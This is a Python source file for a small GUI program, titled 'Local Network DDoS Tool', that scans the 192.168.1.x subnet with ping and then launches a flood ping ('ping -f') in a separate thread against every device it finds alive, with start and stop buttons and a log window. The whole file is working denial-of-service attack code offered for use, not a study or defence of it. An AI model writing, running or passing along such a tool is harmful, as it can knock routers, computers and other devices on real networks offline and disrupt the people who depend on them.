import os
import sys
import subprocess
import threading
import time
import platform
import tkinter as tk
from tkinter import scrolledtext, messagebox
from concurrent.futures import ThreadPoolExecutor

# --- GUI CLASS ---
class DDOSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Local Network DDoS Tool - TEST")
        self.root.geometry("600x450")
        
        # Store attack processes and threads
        self.attack_processes = []
        self.stop_flag = False
        
        # UI Elements
        tk.Label(root, text="Scanning 192.168.1.x...", font=("Arial", 12)).pack(pady=10)
        
        self.log_box = scrolledtext.ScrolledText(root, width=70, height=25, state='disabled')
        self.log_box.pack(padx=10, pady=5)

        btn_frame = tk.Frame(root)
        btn_frame.pack()
        
        self.scan_btn = tk.Button(btn_frame, text="Start Scan & Attack", 
                                  command=self.start_scan, bg="#4CAF50", fg="white")
        self.scan_btn.pack(side=tk.LEFT, padx=10)
        
        self.stop_btn = tk.Button(btn_frame, text="Stop All Attacks", 
                                  command=self.stop_all, bg="#f44336", fg="white")
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        # Handle window close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Log startup info
        self.log("Application started")
        self.log(f"UID: {os.getuid()}")
        self.log(f"Frozen: {getattr(sys, 'frozen', False)}")
        self.log(f"Executable: {sys.executable}")

    def log(self, message):
        """Thread-safe logging to the UI"""
        try:
            self.root.after(0, self._update_log, message)
        except:
            print(message)  # Fallback to console

    def _update_log(self, message):
        try:
            self.log_box.config(state='normal')
            self.log_box.insert(tk.END, message + "\n")
            self.log_box.see(tk.END)
            self.log_box.config(state='disabled')
        except:
            pass

    def is_device_alive(self, ip):
        """Checks if device is alive"""
        if self.stop_flag:
            return False
            
        cmd = ['ping', '-c', '1', '-W', '1000', ip]
        try:
            result = subprocess.run(cmd, stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL, timeout=2)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, Exception):
            return False

    def start_flood(self, ip):
        """Starts the ping flood"""
        if self.stop_flag:
            return
            
        self.log(f"🚀 Attacking {ip}...")
        try:
            process = subprocess.Popen(
                ['ping', '-f', ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.attack_processes.append(process)
            
            while not self.stop_flag and process.poll() is None:
                time.sleep(0.5)
                
            if process.poll() is None:
                process.terminate()
                process.wait(timeout=3)
                
        except Exception as e:
            self.log(f"Error attacking {ip}: {e}")
        finally:
            if process in self.attack_processes:
                self.attack_processes.remove(process)

    def start_scan(self):
        """Main scanning logic"""
        self.stop_flag = False
        self.scan_btn.config(state='disabled')
        self.log("🔍 Starting network scan...")
        
        # Clear previous processes
        for process in self.attack_processes:
            try:
                process.terminate()
            except:
                pass
        self.attack_processes.clear()
        
        ips_to_scan = [f"192.168.1.{i}" for i in range(1, 255)]
        found_devices = []

        self.log(f"Scanning {len(ips_to_scan)} IP addresses...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.is_device_alive, ip): ip for ip in ips_to_scan}
            
            for future in futures:
                if self.stop_flag:
                    break
                    
                ip = futures[future]
                try:
                    if future.result():
                        found_devices.append(ip)
                        self.log(f"[+] Found Active Device: {ip}")
                        
                        t = threading.Thread(target=self.start_flood, args=(ip,), daemon=True)
                        t.start()
                except Exception as e:
                    self.log(f"Scan error for {ip}: {e}")

        if not found_devices:
            self.log("No devices found on 192.168.1.x network")
        else:
            self.log(f"Scan complete. Found {len(found_devices)} devices.")
        
        self.scan_btn.config(state='normal')

    def stop_all(self):
        """Stop all attacks"""
        self.log("🛑 Stopping all attacks...")
        self.stop_flag = True
        
        for process in self.attack_processes:
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        self.attack_processes.clear()
        self.scan_btn.config(state='normal')

    def on_closing(self):
        """Handle window close"""
        self.stop_all()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = DDOSApp(root)
    root.mainloop()
